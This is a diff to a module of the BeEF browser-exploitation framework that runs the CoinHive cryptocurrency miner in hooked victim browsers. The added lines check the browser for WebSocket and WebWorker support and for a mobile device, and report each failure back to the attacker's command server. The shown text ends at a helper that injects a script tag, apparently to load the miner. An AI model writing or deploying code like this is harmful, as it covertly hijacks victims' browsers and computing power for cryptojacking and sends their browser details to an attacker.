@@ -7,6 +7,25 @@ beef.execute(function() {
   var comm_url = '<%= @command_url %>';
   var comm_id = <%= @command_id %>;
 
+  if (!beef.browser.hasWebSocket()) {
+    beef.debug('[CoinHive] Error: browser does not support WebSockets');
+    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebSockets", beef.are.status_error());
+    return;
+  }
+
+  if (!beef.browser.hasWebWorker()) {
+    beef.debug('[CoinHive] Error: browser does not support WebWorkers');
+    beef.net.send(comm_url, comm_id, "error=unsupported browser - does not support WebWorkers", beef.are.status_error());
+    return;
+  }
+
+  var mobile_enabled = '<%= @mobile_enabled %>';
+  if (beef.hardware.isMobileDevice() && !mobile_enabled) {
+    beef.debug('[CoinHive] Error: browser is a mobile device');
+    beef.net.send(comm_url, comm_id, "error=unsupported browser - mobile device", beef.are.status_error());
+    return;
+  }
+
   load_script = function(url) {
     var s = document.createElement('script');
     s.type = 'text/javascript';
